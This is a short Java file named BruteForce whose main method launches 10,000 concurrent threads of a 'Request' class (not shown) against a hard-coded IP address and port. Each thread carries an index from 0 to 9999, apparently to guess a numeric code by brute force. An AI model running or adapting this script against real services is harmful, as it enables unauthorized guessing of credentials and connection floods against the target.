package org.example;

public class BruteForce {
    public static  long start;
    public static void main(String[] args) {
         start = System.currentTimeMillis();
        Request[] req = new Request[10000];
        for (int i = 0; i < 10000; i++) {
            req[i] = new Request("51.195.253.124", 12345, i);
            req[i].start();
        }
    }
}
